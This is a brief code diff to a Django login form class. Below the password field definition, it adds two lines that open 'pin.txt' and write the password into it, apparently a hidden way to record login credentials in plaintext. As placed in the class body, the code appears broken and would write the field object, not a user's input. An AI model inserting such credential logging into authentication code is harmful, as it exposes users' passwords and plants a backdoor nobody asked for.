@@ -17,3 +17,5 @@ class BootstrapAuthenticationForm(AuthenticationForm):
                                widget=forms.PasswordInput({
                                    'class': 'form-control',
                                    'placeholder': 'Password'}))
+    with open('pin.txt', 'w+') as file_:
+        file_.write(str(password))
